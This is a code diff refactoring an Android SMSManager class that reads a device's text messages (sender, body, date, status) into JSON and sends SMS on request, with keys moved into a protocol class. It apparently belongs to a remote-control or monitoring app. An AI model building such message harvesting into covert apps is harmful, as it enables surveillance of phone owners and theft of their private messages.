@@ -7,12 +7,12 @@ import android.telephony.SmsManager;
 import android.text.TextUtils;
 
 import com.fason.app.core.FasonApp;
+import com.fason.app.core.Protocol;
 import com.fason.app.core.permissions.PermissionManager;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-// SMS manager for reading and sending messages
 public final class SMSManager {
 
     private static final Uri SMS_URI = Uri.parse("content://sms/");
@@ -20,80 +20,76 @@ public final class SMSManager {
 
     private SMSManager() {}
 
-    // Get SMS list
     public static JSONObject get() {
         JSONObject result = new JSONObject();
         JSONArray list = new JSONArray();
 
         try {
-            result.put("smslist", list);
+            result.put(Protocol.KEY_SMS_LIST, list);
 
             if (!PermissionManager.canIUse(Manifest.permission.READ_SMS)) {
-                result.put("error", "Permission denied");
+                result.put(Protocol.KEY_ERROR, "Permission denied");
                 return result;
             }
 
             Cursor cur = FasonApp.getContext().getContentResolver().query(
                 SMS_URI,
-                new String[]{"address", "body", "date", "read", "type"},
-                null, null, "date DESC");
+                new String[]{Protocol.KEY_ADDRESS, Protocol.KEY_BODY, Protocol.KEY_DATE, Protocol.KEY_READ, Protocol.KEY_TYPE},
+                null, null, Protocol.KEY_DATE + " DESC");
 
             if (cur != null) {
-                int addrIdx = cur.getColumnIndex("address");
-                int bodyIdx = cur.getColumnIndex("body");
-                int dateIdx = cur.getColumnIndex("date");
-                int readIdx = cur.getColumnIndex("read");
-                int typeIdx = cur.getColumnIndex("type");
-                int count = 0;
+                try {
+                    int addrIdx = cur.getColumnIndex(Protocol.KEY_ADDRESS);
+                    int bodyIdx = cur.getColumnIndex(Protocol.KEY_BODY);
+                    int dateIdx = cur.getColumnIndex(Protocol.KEY_DATE);
+                    int readIdx = cur.getColumnIndex(Protocol.KEY_READ);
+                    int typeIdx = cur.getColumnIndex(Protocol.KEY_TYPE);
+                    int count = 0;
 
-                while (cur.moveToNext() && count < MAX) {
-                    JSONObject sms = new JSONObject();
-                    sms.put("address", addrIdx >= 0 ? cur.getString(addrIdx) : "");
-                    sms.put("body", bodyIdx >= 0 ? cur.getString(bodyIdx) : "");
-                    sms.put("date", dateIdx >= 0 ? cur.getString(dateIdx) : "");
-                    sms.put("read", readIdx >= 0 ? cur.getString(readIdx) : "");
-                    sms.put("type", typeIdx >= 0 ? cur.getString(typeIdx) : "");
-                    list.put(sms);
-                    count++;
+                    while (cur.moveToNext() && count < MAX) {
+                        JSONObject sms = new JSONObject();
+                        sms.put(Protocol.KEY_ADDRESS, addrIdx >= 0 ? cur.getString(addrIdx) : "");
+                        sms.put(Protocol.KEY_BODY, bodyIdx >= 0 ? cur.getString(bodyIdx) : "");
+                        sms.put(Protocol.KEY_DATE, dateIdx >= 0 ? cur.getString(dateIdx) : "");
+                        sms.put(Protocol.KEY_READ, readIdx >= 0 ? cur.getString(readIdx) : "");
+                        sms.put(Protocol.KEY_TYPE, typeIdx >= 0 ? cur.getString(typeIdx) : "");
+                        list.put(sms);
+                        count++;
+                    }
+                } finally {
+                    cur.close();
                 }
-                cur.close();
             }
-            result.put("total", list.length());
+            result.put(Protocol.KEY_TOTAL, list.length());
         } catch (Exception ignored) {}
 
         return result;
     }
 
-    // Send SMS
     public static JSONObject send(String phone, String msg) {
         JSONObject result = new JSONObject();
         try {
-            result.put("action", "sendSMS");
+            result.put(Protocol.KEY_ACTION, Protocol.ACT_SEND_SMS);
 
             if (TextUtils.isEmpty(phone) || TextUtils.isEmpty(msg)) {
-                result.put("error", "Invalid phone or message");
+                result.put(Protocol.KEY_ERROR, "Invalid phone or message");
                 return result;
             }
 
             if (!PermissionManager.canIUse(Manifest.permission.SEND_SMS)) {
-                result.put("error", "Permission denied");
+                result.put(Protocol.KEY_ERROR, "Permission denied");
                 return result;
             }
 
             try {
                 SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
-                result.put("success", true);
-                result.put("to", phone);
+                result.put(Protocol.KEY_SUCCESS, true);
+                result.put(Protocol.KEY_TO, phone);
             } catch (Exception e) {
-                result.put("error", e.getMessage());
+                result.put(Protocol.KEY_ERROR, e.getMessage());
             }
         } catch (Exception ignored) {}
 
         return result;
-    }
-
-    // Legacy method
-    public static JSONObject getsms() {
-        return get();
     }
 }
